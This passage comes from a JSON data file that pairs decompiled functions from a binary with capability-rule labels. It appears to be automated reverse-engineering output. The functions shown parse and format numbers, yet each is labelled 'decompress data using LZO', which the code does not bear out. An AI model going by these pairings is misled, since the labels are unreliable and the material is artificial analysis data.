cVar7 = fcn.004bdf60(*(iVar10 + 8), *(iVar10 + 0xc), &var_1eh + 2);\n    if (cVar7 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc0 != 0) || (bVar19)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x004736be;\ncode_r0x004733c8:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x004733e1:\n    if (cVar5 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4229
    },
    "00473a40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00473a40(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint noname_3, int32_t arg_18h, uint *arg_1ch, int32_t *arg_20h\n            )\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint16_t *puVar11;\n    uint8_t uVar12;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint8_t var_31h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar7 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar3 = fcn.00450410(&arg_10h);\n    if (uVar3 == 0) {\n        uVar6 = fcn.004504b0();\n        cVar4 = *(iVar7 + 0x10);\n        if ((((*(iVar7 + 0x72) == uVar6) || (*(iVar7 + 0x70) == uVar6)) &&\n            ((cVar4 == '\\0' || (*(iVar7 + 0x26) != uVar6)))) && (*(iVar7 + 0x24) != uVar6)) {\n            fcn.0048cc10((*(iVar7 + 0x72) != uVar6) * '\\x02' + '+');\n            fcn.004a5ed0();\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            uVar3 = fcn.00450410(&arg_10h);\n            var_38h = 0;\n            uVar12 = 0;\n            if (uVar3 != 0) goto code_r0x00473a90;\n            uVar6 = fcn.004504b0();\n            cVar4 = *(iVar7 + 0x10);\n        }\n        uVar12 = 0;\n        var_38h = 0;\n        while ((((cVar4 == '\\0' || (*(iVar7 + 0x26) != uVar6)) && (*(iVar7 + 0x24) != uVar6)) &&\n               (*(iVar7 + 0x78) == uVar6))) {\n            if (uVar12 == 0) {\n                fcn.0048cc10(0x30);\n                uVar8 = arg_8h[2];\n                if (uVar8 < arg_8h[3]) goto code_r0x00473ff4;\ncode_r0x00474045:\n                (**(*arg_8h + 0x28))();\n            }\n            else {\n                uVar8 = arg_8h[2];\n                if (arg_8h[3] <= uVar8) goto code_r0x00474045;\ncode_r0x00473ff4:\n                arg_8h[2] = uVar8 + 2;\n            }\n            var_38h = var_38h + 1;\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            uVar3 = fcn.00450410(&arg_10h);\n            uVar12 = uVar3;\n            if (uVar3 != 0) goto code_r0x00473a90;\n            uVar6 = fcn.004504b0();\n            uVar12 = 1;\n            cVar4 = *(iVar7 + 0x10);\n        }\n        uVar3 = 0;\n    }\n    else {\n        var_38h = 0;\n        uVar6 = 0;\n        uVar12 = 0;\n    }\ncode_r0x00473a90:\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar7 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar2 = *(iVar7 + 0xa4);\n    if (uVar2 == 0) {\n        if (uVar3 == 0) {\n            var_31h = 0;\ncode_r0x00473ad8:\n            if (9 < uVar6 - 0x30) goto code_r0x00473b55;\ncode_r0x00473ae4:\n            if (uVar6 - 0x30 == -1) goto code_r0x00473b55;\n            fcn.0048cc10((uVar6 - 0x30) + '0');\n            uVar12 = 1;\ncode_r0x00473b04:\n            uVar8 = arg_8h[2];\n            if (arg_8h[3] <= uVar8) goto code_r0x00473e59;\n            do {\n                arg_8h[2] = uVar8 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar4 = fcn.00450410(&arg_10h);\n                    if (cVar4 != '\\0') goto code_r0x00473cae;\n                    uVar6 = fcn.004504b0();\n                    if (uVar6 - 0x30 < 10) goto code_r0x00473ae4;\ncode_r0x00473b55:\n                    if ((*(iVar7 + 0x24) == uVar6) && ((uVar3 | var_31h) == 0)) {\n                        fcn.0048cc10(0x2e);\n                        var_31h = 0;\n                        uVar3 = 1;\n                        goto code_r0x00473b04;\n                    }\n                    if (((*(iVar7 + 0x94) != uVar6) && (*(iVar7 + 0xa0) != uVar6)) ||\n                       (uVar12 = uVar12 & (var_31h ^ 1),  uVar12 == 0)) goto code_r0x00473cae;\n                    fcn.0048cc10(0x65);\n                    if (arg_8h[2] < arg_8h[3]) {\n                        arg_8h[2] = arg_8h[2] + 2;\n                    }\n                    else {\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar4 = fcn.00450410(&arg_10h);\n                    if (cVar4 != '\\0') goto code_r0x0047411d;\n                    uVar6 = fcn.004504b0();\n                    var_31h = uVar12;\n                    if (*(iVar7 + 0x72) == uVar6) {\n                        uVar9 = 0x2b;\n                    }\n                    else {\n                        uVar9 = 0x2d;\n                        if (*(iVar7 + 0x70) != uVar6) goto code_r0x00473ad8;\n                    }\n                    fcn.0048cc10(uVar9);\n                    uVar8 = arg_8h[2];\n                    if (uVar8 < arg_8h[3]) break;\ncode_r0x00473e59:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n    }\n    else if (uVar3 == 0) {\n        var_31h = 0;\n        uVar5 = *(iVar7 + 0x10);\ncode_r0x00473c22:\n        if ((uVar5 != 0) && (*(iVar7 + 0x26) == uVar6)) {\n            uVar3 = uVar3 | var_31h;\n            if (uVar3 == 0) {\n                if (var_38h != 0) {\n                    fcn.0048cc10(var_38h);\n                    var_31h = 0;\n                    var_38h = 0;\n                    goto code_r0x00473c77;\n                }\n                fcn.0048ca60(0, *(*arg_20h + -0xc), 0);\n                iVar10 = *(stack0xffffffe0 + -0xc);\n                goto joined_r0x00474148;\n            }\n            iVar10 = *(stack0xffffffe0 + -0xc);\n            goto joined_r0x00474112;\n        }\n        puVar11 = iVar7 + 0x78;\n        if (*(iVar7 + 0x24) == uVar6) {\n            iVar10 = *(stack0xffffffe0 + -0xc);\n            if ((var_31h | uVar3) == 0) {\n                if (iVar10 != 0) {\n                    fcn.0048cc10(var_38h);\n                }\n                fcn.0048cc10(0x2e);\n                var_31h = var_31h | uVar3;\n                uVar3 = uVar2;\n                goto code_r0x00473c77;\n            }\n            goto joined_r0x00474112;\n        }\n        do {\n            if (*puVar11 == uVar6) {\n                fcn.0048cc10((puVar11 - (iVar7 + 0x78) >> 1) + '0');\n                var_38h = var_38h + 1;\n                uVar8 = arg_8h[2];\n                uVar12 = uVar2;\n                if (uVar8 < arg_8h[3]) goto code_r0x00473c86;\n                goto code_r0x00473e96;\n            }\n            puVar11 = puVar11 + 1;\n        } while (puVar11 != iVar7 + 0x8c);\n        if ((*(iVar7 + 0x94) != uVar6) && (*(iVar7 + 0xa0) != uVar6)) goto code_r0x00473cae;\n        uVar1 = uVar12 & (var_31h ^ 1);\n        iVar10 = *(stack0xffffffe0 + -0xc);\n        if (uVar1 == 0) goto code_r0x00473cb4;\n        if ((iVar10 != 0) && (uVar3 == 0)) {\n            fcn.0048cc10(var_38h);\n        }\n        fcn.0048cc10(0x65);\n        if (arg_8h[2] < arg_8h[3]) {\n            arg_8h[2] = arg_8h[2] + 2;\n        }\n        else {\n            (**(*arg_8h + 0x28))();\n        }\n        arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n        cVar4 = fcn.00450410(&arg_10h);\n        if (cVar4 == '\\0') goto code_r0x00473dd3;\ncode_r0x0047411d:\n        iVar10 = *(stack0xffffffe0 + -0xc);\njoined_r0x00474112:\n        if (iVar10 == 0) goto code_r0x00473cfe;\n        goto code_r0x00473cdb;\n    }\n    iVar10 = *(stack0xffffffe0 + -0xc);\njoined_r0x00474148:\n    if (iVar10 == 0) goto code_r0x00473cfe;\ncode_r0x00473cc4:\n    fcn.0048cc10(var_38h);\n    goto code_r0x00473cdb;\ncode_r0x00473dd3:\n    uVar6 = fcn.004504b0();\n    uVar5 = *(iVar7 + 0x10);\n    if ((((*(iVar7 + 0x72) == uVar6) || (var_31h = uVar1,  uVar12 = uVar1,  *(iVar7 + 0x70) == uVar6)) &&\n        ((uVar5 == 0 || (var_31h = uVar5,  uVar12 = uVar5,  *(iVar7 + 0x26) != uVar6)))) &&\n       (var_31h = uVar1,  uVar12 = uVar1,  *(iVar7 + 0x24) != uVar6)) {\n        fcn.0048cc10((*(iVar7 + 0x72) != uVar6) * '\\x02' + '+');\ncode_r0x00473c77:\n        uVar8 = arg_8h[2];\n        if (uVar8 < arg_8h[3]) {\ncode_r0x00473c86:\n            arg_8h[2] = uVar8 + 2;\n        }\n        else {\ncode_r0x00473e96:\n            (**(*arg_8h + 0x28))();\n        }\n        arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n        cVar4 = fcn.00450410(&arg_10h);\n        if (cVar4 != '\\0') goto code_r0x00473cae;\n        uVar6 = fcn.004504b0();\n        uVar5 = *(iVar7 + 0x10);\n    }\n    goto code_r0x00473c22;\ncode_r0x00473cae:\n    iVar10 = *(stack0xffffffe0 + -0xc);\ncode_r0x00473cb4:\n    if (iVar10 == 0) goto code_r0x00473cfe;\n    if ((uVar3 == 0) && (var_31h == 0)) goto code_r0x00473cc4;\ncode_r0x00473cdb:\n    cVar4 = fcn.004bdf60(*(iVar7 + 8), *(iVar7 + 0xc), &var_1eh + 2);\n    if (cVar4 == '\\0') {\n        *arg_1ch = 4;\n    }\ncode_r0x00473cfe:\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3218
    },
    "004747b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004747b0(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    fcn.0048c930(0x20);\n    uVar9 = fcn.00473a40(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    piVar3 = uVar9;\n    uVar4 = uVar9 >> 0x20 & 0xffff;\n    uVar5 = arg_ch & 0xffff0000 | uVar4;\n    var_1ch = fcn.004ae940();\n    fcn.004bd2f0(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar7 = uVar4 == -1;\n    bVar8 = piVar3 != NULL && bVar7;\n    piVar6 = piVar3;\n    if (bVar8) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar2 = *piVar3[2];\n        }\n        else {\n            iVar2 = (**(*piVar3 + 0x24))();\n        }\n        bVar7 = iVar2 == -1 && bVar8;\n        piVar6 = NULL;\n        if (iVar2 != -1) {\n            piVar6 = piVar3;\n        }\n    }\n    var_38h._0_2_ = arg_14h;\n    bVar8 = var_38h == -1;\n    if ((arg_10h != NULL) && (bVar8)) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar2 = *arg_10h[2];\n        }\n        else {\n            iVar2 = (**(*arg_10h + 0x24))();\n        }\n        bVar8 = iVar2 == -1;\n    }\n    if (bVar8 == bVar7) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_20h + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return CONCAT44(uVar5, piVar6);\n    }\n    fcn.0048b610(&var_1ch);\n    return CONCAT44(uVar5, piVar6);\n}\n",
        "token_count": 806
    },
    "00474990": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00474990(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    fcn.0048c930(0x20);\n    uVar9 = fcn.00473a40(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    piVar3 = uVar9;\n    uVar4 = uVar9 >> 0x20 & 0xffff;\n    uVar5 = arg_ch & 0xffff0000 | uVar4;\n    var_1ch = fcn.004ae940();\n    fcn.004bd410(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar7 = uVar4 == -1;\n    bVar8 = piVar3 != NULL && bVar7;\n    piVar6 = piVar3;\n    if (bVar8) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar2 = *piVar3[2];\n        }\n        else {\n            iVar2 = (**(*piVar3 + 0x24))();\n        }\n        bVar7 = iVar2 == -1 && bVar8;\n        piVar6 = NULL;\n        if (iVar2 != -1) {\n            piVar6 = piVar3;\n        }\n    }\n    var_38h._0_2_ = arg_14h;\n    bVar8 = var_38h == -1;\n    if ((arg_10h != NULL) && (bVar8)) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar2 = *arg_10h[2];\n        }\n        else {\n            iVar2 = (**(*arg_10h + 0x24))();\n        }\n        bVar8 = iVar2 == -1;\n    }\n    if (bVar8 == bVar7) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_20h + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return CONCAT44(uVar5, piVar6);\n    }\n    fcn.0048b610(&var_1ch);\n    return CONCAT44(uVar5, piVar6);\n}\n",
        "token_count": 803
    },
    "00474b70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00474b70(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    fcn.0048c930(0x20);\n    uVar9 = fcn.00473a40(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    piVar3 = uVar9;\n    uVar4 = uVar9 >> 0x20 & 0xffff;\n    uVar5 = arg_ch & 0xffff0000 | uVar4;\n    var_1ch = fcn.004ae940();\n    fcn.004bd520(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar7 = uVar4 == -1;\n    bVar8 = piVar3 != NULL && bVar7;\n    piVar6 = piVar3;\n    if (bVar8) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar2 = *piVar3[2];\n        }\n        else {\n            iVar2 = (**(*piVar3 + 0x24))();\n        }\n        bVar7 = iVar2 == -1 && bVar8;\n        piVar6 = NULL;\n        if (iVar2 != -1) {\n            piVar6 = piVar3;\n        }\n    }\n    var_38h._0_2_ = arg_14h;\n    bVar8 = var_38h == -1;\n    if ((arg_10h != NULL) && (bVar8)) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar2 = *arg_10h[2];\n        }\n        else {\n            iVar2 = (**(*arg_10h + 0x24))();\n        }\n        bVar8 = iVar2 == -1;\n    }\n    if (bVar8 == bVar7) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x515a34 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = var_20h + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return CONCAT44(uVar5, piVar6);\n    }\n    fcn.0048b610(&var_1ch);\n    return CONCAT44(uVar5, piVar6);\n}\n",
        "token_count": 804
    },
    "00474e00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00474e00(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    uint uVar13;\n    uchar *puVar14;\n    ulong uVar15;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar auStack73 [5];\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_30h = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x474e2c;\n    iVar6 = fcn.0044da00(arg_10h + 0x6c);\n    var_2ch = iVar6 + 0x26;\n    uVar2 = *(arg_10h + 0xc);\n    uStackY116 = 0x474e47;\n    iVar7 = fcn.00437ed0();\n    iVar7 = -iVar7;\n    puVar11 = &stack0xffffff90 + iVar7;\n    puVar12 = &stack0xffffff90 + iVar7;\n    var_40h = uVar2 & 0x4a;\n    uVar5 = var_40h != 0x40 && var_40h != 8;\n    var_2ch = var_2ch & 0xffffff00 | uVar5;\n    iVar8 = arg_18h;\n    if (arg_18h < 1) {\n        iVar8 = -arg_18h;\n        if (var_40h == 0x40 || var_40h == 8) {\n            iVar8 = arg_18h;\n        }\n    }\n    *(&stack0xffffff94 + iVar7) = iVar8;\n    *(&stack0xffffff98 + iVar7) = iVar6 + 0x26;\n    *(&stack0xffffffa0 + iVar7) = uVar5;\n    *(&stack0xffffff9c + iVar7) = uVar2;\n    *(&stack0xffffff90 + iVar7) = (&stack0xffffffb7 + iVar7 & 0xfffffff0) + 0x14;\n    var_38h = &stack0xffffffb7 + iVar7 & 0xfffffff0;\n    *(&stack0xffffff8c + iVar7) = 0x474e9d;\n    iVar8 = fcn.004bccb0();\n    if (*(iVar6 + 0x10) == '\\0') {\n        puVar10 = var_38h + (0x14 - iVar8);\n        puVar14 = var_38h + (0x14 - iVar8);\n        if (var_2ch != '\\0') goto code_r0x00474ebb;\ncode_r0x00474fea:\n        puVar14 = puVar10;\n        if (((uVar2 & 0x200) != 0) && (arg_18h != 0)) {\n            if (var_40h == 0x40) {\n                iVar8 = iVar8 + 1;\n                puVar14 = puVar10 + -1;\n                *puVar14 = *(iVar6 + 0x2a);\n            }\n            else {\n                iVar8 = iVar8 + 2;\n                puVar14 = puVar10 + -2;\n                puVar10[-1] = *(iVar6 + 0x28 + (uVar2 >> 0xe & 1));\n                *puVar14 = *(iVar6 + 0x2a);\n            }\n        }\ncode_r0x00474ece:\n        iVar7 = *(arg_10h + 8);\n        puVar11 = puVar12;\n        if (iVar7 <= iVar8) goto code_r0x00474ed8;\n    }\n    else {\n        *(&stack0xffffff8c + iVar7) = 0x474fa0;\n        uVar15 = fcn.00437ed0();\n        iVar9 = uVar15 >> 0x20;\n        iVar4 = -uVar15;\n        puVar11 = &stack0xffffff90 + iVar4 + iVar7;\n        puVar12 = &stack0xffffff90 + iVar4 + iVar7;\n        *(&stack0xffffffa4 + iVar4 + iVar7) = iVar8 + iVar9;\n        *(&stack0xffffffa0 + iVar4 + iVar7) = iVar9;\n        puVar14 = (&stack0xffffffb7 + iVar4 + iVar7 & 0xfffffff0) + 2;\n        *(&stack0xffffff9c + iVar4 + iVar7) = *(iVar6 + 0xc);\n        var_38h = puVar14;\n        *(&stack0xffffff98 + iVar4 + iVar7) = *(iVar6 + 8);\n        cVar1 = *(iVar6 + 0x25);\n        *(&stack0xffffff90 + iVar4 + iVar7) = puVar14;\n        *(&stack0xffffff94 + iVar4 + iVar7) = cVar1;\n        *(&stack0xffffff8c + iVar4 + iVar7) = 0x474fd7;\n        iVar8 = fcn.004bd030();\n        iVar8 = iVar8 - var_38h;\n        puVar10 = var_38h;\n        puVar14 = var_38h;\n        if (var_2ch == '\\0') goto code_r0x00474fea;\ncode_r0x00474ebb:\n        puVar12 = puVar11;\n        if (arg_18h < 0) {\n            iVar8 = iVar8 + 1;\n            puVar14[-1] = *(iVar6 + 0x26);\n            puVar14 = puVar14 + -1;\n            goto code_r0x00474ece;\n        }\n        if ((uVar2 & 0x800) == 0) goto code_r0x00474ece;\n        iVar8 = iVar8 + 1;\n        puVar14 = puVar14 + -1;\n        *puVar14 = *(iVar6 + 0x27);\n        iVar7 = *(arg_10h + 8);\n        if (iVar7 <= iVar8) goto code_r0x00474ed8;\n    }\n    *(puVar11 + -4) = 0x474f44;\n    uVar15 = fcn.00437ed0();\n    iVar6 = -uVar15;\n    *(puVar11 + iVar6 + 0x14) = iVar8;\n    *(puVar11 + iVar6 + 4) = var_3ch;\n    puVar14 = puVar11 + iVar6 + 0x27 & 0xfffffff0;\n    *(puVar11 + iVar6 + 0xc) = uVar15 >> 0x20;\n    *(puVar11 + iVar6 + 0x10) = iVar7;\n    *(puVar11 + iVar6 + 8) = puVar14;\n    *(puVar11 + iVar6) = arg_10h;\n    *(puVar11 + iVar6 + -4) = 0x474f72;\n    fcn.004aba90();\n    iVar8 = iVar7;\n    puVar11 = puVar11 + iVar6;\ncode_r0x00474ed8:\n    uVar13 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar7 = *var_30h;\n        puVar11[1] = iVar8;\n        *puVar11 = puVar14;\n        pcVar3 = *(iVar7 + 0x30);\n        puVar11[-1] = 0x474efa;\n        iVar7 = (*pcVar3)();\n        if (iVar7 != iVar8) {\n            uVar13 = 1;\n        }\n    }\n    return CONCAT44(uVar13, var_30h) & 0xffffffffff;\n}\n",
        "token_count": 1917
    },
    "00475040": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00475040(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uint uVar14;\n    uchar *puVar15;\n    ulong uVar16;\n    uint uStackY116;\n    int32_t iStackY112;\n    uchar uStack73;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint var_34h;\n    char var_2dh;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_34h = arg_ch;\n    var_3ch = arg_14h;\n    iStackY112 = 0x47506c;\n    iVar5 = fcn.0044da00(arg_10h + 0x6c);\n    uVar2 = *(arg_10h + 0xc);\n    uStackY116 = 0x475087;\n    var_44h = iVar5 + 0x26;\n    iVar6 = fcn.00437ed0();\n    iVar6 = -iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    puVar11 = &stack0xffffff90 + iVar6;\n    uVar7 = uVar2 & 0x4a;\n    *(&stack0xffffff98 + iVar6) = iVar5 + 0x26;\n    var_40h = uVar7;\n    *(&stack0xffffff9c + iVar6) = uVar2;\n    var_38h = &stack0xffffffb7 + iVar6 & 0xfffffff0;\n    var_2dh = uVar7 != 0x40 && uVar7 != 8;\n    *(&stack0xffffffa0 + iVar6) = var_2dh;\n    *(&stack0xffffff94 + iVar6) = arg_18h;\n    *(&stack0xffffff90 + iVar6) = (&stack0xffffffb7 + iVar6 & 0xfffffff0) + 0x14;\n    *(&stack0xffffff8c + iVar6) = 0x4750cd;\n    iVar8 = fcn.004bccb0();\n    puVar9 = var_38h + (0x14 - iVar8);\n    if (*(iVar5 + 0x10) != '\\0') {\n        *(&stack0xffffff8c + iVar6) = 0x47514f;\n        uVar16 = fcn.00437ed0();\n        iVar10 = uVar16 >> 0x20;\n        iVar4 = -uVar16;\n        puVar12 = &stack0xffffff90 + iVar4 + iVar6;\n        puVar11 = &stack0xffffff90 + iVar4 + iVar6;\n        *(&stack0xffffffa4 + iVar4 + iVar6) = iVar8 + iVar10;\n        *(&stack0xffffffa0 + iVar4 + iVar6) = iVar10;\n        puVar9 = (&stack0xffffffb7 + iVar4 + iVar6 & 0xfffffff0) + 2;\n        *(&stack0xffffff9c + iVar4 + iVar6) = *(iVar5 + 0xc);\n        var_38h = puVar9;\n        *(&stack0xffffff98 + iVar4 + iVar6) = *(iVar5 + 8);\n        cVar1 = *(iVar5 + 0x25);\n        *(&stack0xffffff90 + iVar4 + iVar6) = puVar9;\n        *(&stack0xffffff94 + iVar4 + iVar6) = cVar1;\n        *(&stack0xffffff8c + iVar4 + iVar6) = 0x475186;\n        iVar8 = fcn.004bd030();\n        iVar8 = iVar8 - var_38h;\n        puVar9 = var_38h;\n    }\n    puVar15 = puVar9;\n    if (((var_2dh == '\\0') && (puVar12 = puVar11,  (uVar2 & 0x200) != 0)) && (arg_18h != 0)) {\n        if (var_40h == 0x40) {\n            iVar8 = iVar8 + 1;\n            puVar15 = puVar9 + -1;\n            *puVar15 = *(iVar5 + 0x2a);\n        }\n        else {\n            iVar8 = iVar8 + 2;\n            puVar15 = puVar9 + -2;\n            puVar9[-1] = *(var_44h + 2 + (uVar2 >> 0xe & 1));\n            *puVar15 = *(iVar5 + 0x2a);\n        }\n    }\n    iVar6 = *(arg_10h + 8);\n    puVar13 = puVar12;\n    if (iVar8 < iVar6) {\n        *(puVar12 + -4) = 0x4751ee;\n        uVar16 = fcn.00437ed0();\n        iVar5 = -uVar16;\n        puVar13 = puVar12 + iVar5;\n        *(puVar12 + iVar5 + 0x14) = iVar8;\n        *(puVar12 + iVar5 + 4) = var_3ch;\n        puVar15 = puVar12 + iVar5 + 0x27 & 0xfffffff0;\n        *(puVar12 + iVar5 + 0xc) = uVar16 >> 0x20;\n        *(puVar12 + iVar5 + 0x10) = iVar6;\n        *(puVar12 + iVar5 + 8) = puVar15;\n        *(puVar12 + iVar5) = arg_10h;\n        *(puVar12 + iVar5 + -4) = 0x47521c;\n        fcn.004aba90();\n        iVar8 = iVar6;\n    }\n    uVar14 = var_34h;\n    *(arg_10h + 8) = 0;\n    if (var_34h == '\\0') {\n        iVar6 = *var_2ch;\n        puVar13[1] = iVar8;\n        *puVar13 = puVar15;\n        pcVar3 = *(iVar6 + 0x30);\n        puVar13[-1] = 0x475117;\n        iVar6 = (*pcVar3)();\n        if (iVar6 != iVar8) {\n            uVar14 = 1;\n        }\n    }\n    return CONCAT44(uVar14, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1590
    },
    "00475240": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
